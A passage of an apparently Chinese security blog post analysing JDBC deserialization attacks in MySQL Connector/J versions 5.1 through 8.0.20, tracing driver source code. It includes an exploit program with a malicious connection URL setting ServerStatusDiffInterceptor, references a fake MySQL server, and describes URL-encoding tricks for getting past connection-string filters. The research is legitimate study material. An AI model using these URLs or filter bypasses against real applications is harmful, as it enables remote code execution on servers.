<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="keyword">if</span> (packet == <span class="literal">null</span>) &#123;</span><br><span class="line">         encoding = <span class="literal">null</span>;</span><br><span class="line">         <span class="keyword">if</span> (<span class="built_in">this</span>.getUseUnicode()) &#123;</span><br><span class="line">             encoding = <span class="built_in">this</span>.getEncoding();</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="type">ResultSetInternalMethods</span> <span class="variable">var44</span> <span class="operator">=</span> <span class="built_in">this</span>.io.sqlQueryDirect(callingStatement, sql, encoding, (Buffer)<span class="literal">null</span>, maxRows, resultSetType, resultSetConcurrency, streamResults, catalog, cachedMetadata);</span><br><span class="line">         <span class="keyword">return</span> var44;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p>跟进sqlQueryDirect⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.statementInterceptors != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ResultSetInternalMethods</span> <span class="variable">interceptedResults</span> <span class="operator">=</span> <span class="built_in">this</span>.invokeStatementInterceptorsPre(query, callingStatement);</span><br><span class="line">        <span class="keyword">if</span> (interceptedResults != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ResultSetInternalMethods</span> <span class="variable">var12</span> <span class="operator">=</span> interceptedResults;</span><br><span class="line">            <span class="keyword">return</span> var12;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进invokeStatementInterceptorsPre⽅法</p>
<p><img src="https://baicany.github.io/images/image-20231020161924224.png" alt="image-20231020161924224"></p>
<p>但默认情况下size会为0，看看是怎么控制的 MysqlIO类提供setStatementInterceptors⽅法⽤来设置StatementInterceptors</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setStatementInterceptors</span><span class="params">(List statementInterceptors)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.statementInterceptors = statementInterceptors;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>⽽在ConnectionImpl类构造⽅法中，在执⾏createNewIO⽅法时实例化了MysqlIO对象</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.io = <span class="keyword">new</span> <span class="title class_">MysqlIO</span>(newHostPortPair, hostIndex, mergedProps, <span class="built_in">this</span>.getSocketFactoryClassName(), <span class="built_in">this</span>, <span class="built_in">this</span>.getSocketTimeout(), <span class="built_in">this</span>.largeRowSizeThreshold.getValueAsInt());</span><br><span class="line"><span class="built_in">this</span>.io.doHandshake(<span class="built_in">this</span>.user, <span class="built_in">this</span>.password, <span class="built_in">this</span>.database);</span><br></pre></td></tr></table></figure>

<p>⼜刚好触发了MysqlIO对象这个⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.initializeStatementInterceptors();</span><br><span class="line">          <span class="built_in">this</span>.io.setStatementInterceptors(<span class="built_in">this</span>.statementInterceptors);</span><br></pre></td></tr></table></figure>

<p>⽽ConnectionImpl类下的StatementInterceptors可以通过添加扩展参数设置 那么这个参数的值应该为什么呢，⾸先这个类必须实现com.mysql.jdbc.StatementInterceptor接⼝，这⾥选⽤ com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor这个类</p>
<p>那么在invokeStatementInterceptorsPre⽅法中，会调⽤ServerStatusDiffInterceptor#preProcess⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ResultSetInternalMethods <span class="title function_">preProcess</span><span class="params">(String sql, Statement interceptedStatement, Connection connection)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (connection.versionMeetsMinimum(<span class="number">5</span>, <span class="number">0</span>, <span class="number">2</span>)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.populateMapWithSessionStatusValues(connection, <span class="built_in">this</span>.preExecuteValues);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>驱动版本⼤于5.0.2，调⽤populateMapWithSessionStatusValues⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">populateMapWithSessionStatusValues</span><span class="params">(Connection connection, Map toPopulate)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    java.sql.<span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        toPopulate.clear();</span><br><span class="line">        stmt = connection.createStatement();</span><br><span class="line">        rs = stmt.executeQuery(<span class="string">&quot;SHOW SESSION STATUS&quot;</span>);</span><br><span class="line">        Util.resultSetToMap(toPopulate, rs);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (rs != <span class="literal">null</span>) &#123;</span><br><span class="line">            rs.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>⽅法中调⽤Util.resultSetToMap⽅法，⽅法内触发getObject⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">resultSetToMap</span><span class="params">(Map mappedValues, ResultSet rs)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">while</span>(rs.next()) &#123;</span><br><span class="line">        mappedValues.put(rs.getObject(<span class="number">1</span>), rs.getObject(<span class="number">2</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只需要SHOW SESSION STATUS语句返回的字段1或2的类型为blob，且内容为恶意的序列化数据即</p>
<p>⽤4ra1n师傅做的mysql-fake-server项⽬进⾏利⽤</p>
<p>exp:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.mysql.jdbc.Driver;</span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/mysql?serverTimezone=UTC&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">USERNAME</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(URL, USERNAME, PASSWORD);</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user&quot;</span>;</span><br><span class="line">        <span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> connection.prepareStatement(sql);</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">set</span> <span class="operator">=</span> ps.executeQuery();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>**mysql-connector-java-5.1.11——5.x.xx **</p>
<p>环境：mysql-connector-java-5.1.29 </p>
<p>定位到ConnetionImpl#initializePropsFromServer⽅法，跟detectCustomCollations链不同的是，这⾥要利⽤的是loadServerVariables ⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String sqlModeAsString;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.versionMeetsMinimum(<span class="number">3</span>, <span class="number">21</span>, <span class="number">22</span>)) &#123;</span><br><span class="line">    <span class="built_in">this</span>.loadServerVariables();</span><br></pre></td></tr></table></figure>

<p>跟进loadServerVariables方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.serverVariables = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    results = stmt.executeQuery(query);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(results.next()) &#123;</span><br><span class="line">        <span class="built_in">this</span>.serverVariables.put(results.getString(<span class="number">1</span>), results.getString(<span class="number">2</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    results.close();</span><br><span class="line">    results = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<p>这里并没有触发getboject跟进executeQuery</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="built_in">this</span>.statementBegins();</span><br><span class="line">                            <span class="built_in">this</span>.results = locallyScopedConn.execSQL(<span class="built_in">this</span>, sql, -<span class="number">1</span>, (Buffer)<span class="literal">null</span>, <span class="built_in">this</span>.resultSetType, <span class="built_in">this</span>.resultSetConcurrency, doStreaming, <span class="built_in">this</span>.currentCatalog, cachedFields);</span><br><span class="line">                        &#125;</span><br></pre></td></tr></table></figure>

<p>所以5.1.0——5.1.10版本的查询语句也可以是这样</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line">statement.executeQuery(<span class="string">&quot;select * from user&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这⾥是在查询时触发反序列化，⽽上⾯是获取结果处触发</p>
<p>**mysql-connector-java-6.x **</p>
<p>跟上⾯5.1.11——5.x.xx完全相同，仅换了驱动包包名，为com.mysql.cj.jdbc</p>
<p><strong>mysql-connector-java-8.0.7——8.0.20</strong> </p>
<p>环境：mysql-connector-java-8.0.12 </p>
<p>定位到ConnetionImpl类initializePropsFromServer⽅法，可以发现，已经不是调⽤当前对象的loadServerVariables和 buildCollationMapping⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.session.setSessionVariables();</span><br><span class="line"><span class="built_in">this</span>.session.loadServerVariables(<span class="built_in">this</span>.getConnectionMutex(), <span class="built_in">this</span>.dbmd.getDriverVersion());</span><br><span class="line"><span class="built_in">this</span>.autoIncrementIncrement = <span class="built_in">this</span>.session.getServerSession().getServerVariable(<span class="string">&quot;auto_increment_increment&quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="built_in">this</span>.session.buildCollationMapping();</span><br></pre></td></tr></table></figure>

<p>但其中调⽤了的handleAutoCommitDefaults⽅法可以利⽤</p>
<p><img src="https://baicany.github.io/images/image-20231025201132763.png" alt="image-20231025201132763"></p>
<p>handleAutoCommitDefaults⽅法中，resetAutoCommitDefault会被赋值为true，会调⽤setAutoCommit⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (resetAutoCommitDefault) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.setAutoCommit(<span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException var5) &#123;</span><br><span class="line">        <span class="keyword">if</span> (var5.getErrorCode() != <span class="number">1820</span> || (Boolean)<span class="built_in">this</span>.disconnectOnExpiredPasswords.getValue()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>handleAutoCommitDefaults⽅法中，resetAutoCommitDefault会被赋值为true，会调⽤setAutoCommit⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (needsSetOnServer) &#123;</span><br><span class="line">    <span class="built_in">this</span>.session.execSQL((Query)<span class="literal">null</span>, autoCommitFlag ? <span class="string">&quot;SET autocommit=1&quot;</span> : <span class="string">&quot;SET autocommit=0&quot;</span>, -<span class="number">1</span>, (NativePacketPayload)<span class="literal">null</span>, <span class="literal">false</span>, <span class="built_in">this</span>.nullStatementResultSetFactory, <span class="built_in">this</span>.database, (ColumnDefinition)<span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进execSQL</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    var24 = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (packet == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">encoding</span> <span class="operator">=</span> (String)<span class="built_in">this</span>.characterEncoding.getValue();</span><br><span class="line">        var30 = ((NativeProtocol)<span class="built_in">this</span>.protocol).sendQueryString(callingQuery, query, encoding, maxRows, streamResults, catalog, cachedMetadata, <span class="built_in">this</span>::getProfilerEventHandlerInstanceFunction, resultSetFactory);</span><br><span class="line">        var24 = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">break</span> label222;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟上⾯不同，调⽤的对象不同了，这⾥要利⽤的是sendQueryString⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.sendQueryPacket(callingQuery, sendPacket, maxRows, streamResults, catalog, cachedMetadata, getProfilerEventHandlerInstanceFunction, resultSetFactory);</span><br></pre></td></tr></table></figure>

<p>⽅法最后调⽤了sendQueryPacket⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.queryInterceptors != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">T</span> <span class="variable">interceptedResults</span> <span class="operator">=</span> <span class="built_in">this</span>.invokeQueryInterceptorsPre(query, callingQuery, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (interceptedResults != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Resultset</span> <span class="variable">var41</span> <span class="operator">=</span> interceptedResults;</span><br><span class="line">            <span class="keyword">return</span> var41;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟上⾯的invokeStatementInterceptorsPre很像，跟进invokeQueryInterceptorsPre⽅法看看 但需要保证queryInterceptors不为null，看看怎么控制 位于ConnetionImpl#connectOneTryOnly⽅法处，逻辑跟上⾯差不多，还是可以通过扩展参数设置</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.session.setQueryInterceptors(<span class="built_in">this</span>.queryInterceptors);</span><br><span class="line"><span class="built_in">this</span>.initializePropsFromServer();</span><br></pre></td></tr></table></figure>

<p>这样就能进⼊invokeQueryInterceptorsPre⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">s</span> <span class="operator">=</span> <span class="built_in">this</span>.queryInterceptors.size(); i &lt; s; ++i) &#123;</span><br><span class="line">    <span class="type">QueryInterceptor</span> <span class="variable">interceptor</span> <span class="operator">=</span> (QueryInterceptor)<span class="built_in">this</span>.queryInterceptors.get(i);</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">executeTopLevelOnly</span> <span class="operator">=</span> interceptor.executeTopLevelOnly();</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">shouldExecute</span> <span class="operator">=</span> executeTopLevelOnly &amp;&amp; (<span class="built_in">this</span>.statementExecutionDepth == <span class="number">1</span> || forceExecute) || !executeTopLevelOnly;</span><br><span class="line">    <span class="keyword">if</span> (shouldExecute) &#123;</span><br><span class="line">        <span class="type">T</span> <span class="variable">interceptedResultSet</span> <span class="operator">=</span> interceptor.preProcess(sql, interceptedQuery);</span><br><span class="line">        <span class="keyword">if</span> (interceptedResultSet != <span class="literal">null</span>) &#123;</span><br><span class="line">            previousResultSet = interceptedResultSet;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>逻辑跟上⾯差不多，调⽤了preProcess⽅法，设置queryInterceptors为com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Resultset</span>&gt; T <span class="title function_">preProcess</span><span class="params">(Supplier&lt;String&gt; sql, Query interceptedQuery)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.populateMapWithSessionStatusValues(<span class="built_in">this</span>.preExecuteValues);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进populateMapWithSessionStatusValues⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stmt = <span class="built_in">this</span>.connection.createStatement();</span><br><span class="line">rs = stmt.executeQuery(<span class="string">&quot;SHOW SESSION STATUS&quot;</span>);</span><br><span class="line">ResultSetUtil.resultSetToMap(toPopulate, rs);</span><br></pre></td></tr></table></figure>

<p>ResultSetUtil.resultSetToMap⽅法内执⾏了getObject⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">resultSetToMap</span><span class="params">(Map mappedValues, ResultSet rs)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">while</span>(rs.next()) &#123;</span><br><span class="line">        mappedValues.put(rs.getObject(<span class="number">1</span>), rs.getObject(<span class="number">2</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Bypass 环境：</p>
<p>mysql-connector-java-8.0.12 </p>
<p>Urlencode 协议头</p>
<p>Urlencode 逻辑位于com.mysql.cj.conf.ConnetionUrlParser#isConnectionStringSupported⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isConnectionStringSupported</span><span class="params">(String connString)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (connString == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (WrongArgumentException)ExceptionFactory.createException(WrongArgumentException.class, Messages.getString(<span class="string">&quot;ConnectionString.0&quot;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> SCHEME_PTRN.matcher(connString);</span><br><span class="line">        <span class="keyword">return</span> matcher.matches() &amp;&amp; Type.isSupported(decode(matcher.group(<span class="string">&quot;scheme&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现这里会调用异地decode方法就是urldecode</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">decode</span><span class="params">(String text)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isNullOrEmpty(text)) &#123;</span><br><span class="line">        <span class="keyword">return</span> text;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> URLDecoder.decode(text, StandardCharsets.UTF_8.name());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException var2) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>path部分Urlencode 逻辑位于com.mysql.cj.conf.ConnectionUrlParser#parseConnectionString⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">parseConnectionString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">connString</span> <span class="operator">=</span> <span class="built_in">this</span>.baseConnectionString;</span><br><span class="line">    <span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> CONNECTION_STRING_PTRN.matcher(connString);</span><br><span class="line">    <span class="keyword">if</span> (!matcher.matches()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (WrongArgumentException)ExceptionFactory.createException(WrongArgumentException.class, Messages.getString(<span class="string">&quot;ConnectionString.1&quot;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.scheme = decode(matcher.group(<span class="string">&quot;scheme&quot;</span>));</span><br><span class="line">        <span class="built_in">this</span>.authority = matcher.group(<span class="string">&quot;authority&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.path = matcher.group(<span class="string">&quot;path&quot;</span>) == <span class="literal">null</span> ? <span class="literal">null</span> : decode(matcher.group(<span class="string">&quot;path&quot;</span>)).trim();</span><br><span class="line">        <span class="built_in">this</span>.query = matcher.group(<span class="string">&quot;query&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>path部分也进⾏了⼀次decode⽅法处理，此外还进⾏了trim⽅法处理，但⽅法不能去除字符串中间的空⽩字符，所以只能进⾏ Urlencode绕过啦 </p>
<p>扩展参数Urlencode </p>
<p>在实例化SingleConnectionUrl对象时，会触发⽗类构造方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">ConnectionUrl</span><span class="params">(ConnectionUrlParser connStrParser, Properties info)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.originalConnStr = connStrParser.getDatabaseUrl();</span><br><span class="line">    <span class="built_in">this</span>.originalDatabase = connStrParser.getPath() == <span class="literal">null</span> ? <span class="string">&quot;&quot;</span> : connStrParser.getPath();</span><br><span class="line">    <span class="built_in">this</span>.collectProperties(connStrParser, info);</span><br><span class="line">    <span class="built_in">this</span>.collectHostsInfo(connStrParser);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会调⽤collectProperties⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">collectProperties</span><span class="params">(ConnectionUrlParser connStrParser, Properties info)</span> &#123;</span><br><span class="line">    connStrParser.getProperties().entrySet().stream().forEach((e) -&gt; &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var10000</span> <span class="operator">=</span> (String)<span class="built_in">this</span>.properties.put(PropertyKey.normalizeCase((String)e.getKey()), e.getValue());</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">if</span> (info != <span class="literal">null</span>) &#123;</span><br><span class="line">        info.stringPropertyNames().stream().forEach((k) -&gt; &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">var10000</span> <span class="operator">=</span> (String)<span class="built_in">this</span>.properties.put(PropertyKey.normalizeCase(k), info.getProperty(k));</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.processColdFusionAutoConfiguration();</span><br><span class="line">    <span class="built_in">this</span>.setupPropertiesTransformer();</span><br><span class="line">    <span class="built_in">this</span>.expandPropertiesFromConfigFiles(<span class="built_in">this</span>.properties);</span><br><span class="line">    <span 